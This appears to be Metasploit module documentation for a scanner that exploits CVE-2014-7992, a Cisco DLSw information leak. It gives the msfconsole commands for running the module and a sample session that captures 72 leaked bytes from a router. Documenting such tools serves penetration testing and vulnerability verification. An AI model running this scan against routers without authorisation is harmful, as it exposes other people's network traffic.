## Vulnerable Application

This module implements the DLSw information disclosure retrieval. There is a bug in Cisco's DLSw implementation affecting 12.x and 15.x trains that allows an unauthenticated remote attacker to retrieve the partial contents of packets traversing a Cisco router with DLSw configured and active.

## Verification Steps

1. Start msfconsole
2. Do: `use modules/auxiliary/scanner/dlsw/dlsw_leak_capture`
3. Set: `RHOSTS [ip]`
4. Do: `run`

## Scenarios

### IOS version 12.4(8) and Kali Linux 2019.3

  ```
  msf > use modules/auxiliary/scanner/dlsw/dlsw_leak_capture
  msf auxiliary(scanner/dlsw/dlsw_leak_capture) > set RHOSTS 192.168.0.1
    RHOSTS => 192.168.0.1
  msf auxiliary(scanner/dlsw/dlsw_leak_capture) > run
    [*] 192.168.0.1:2067      - Checking for DLSw information disclosure (CVE-2014-7992)
    [+] 192.168.0.1:2067      - Vulnerable to DLSw information disclosure; leaked 72 bytes
    [*] 192.168.0.1:2067      - DLSw leaked data stored in /root/.msf4/loot/20191124231804_default_192.168.0.1_dlsw.packet.cont_518857.bin
    [*] 192.168.0.1:2067      - Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
  ```
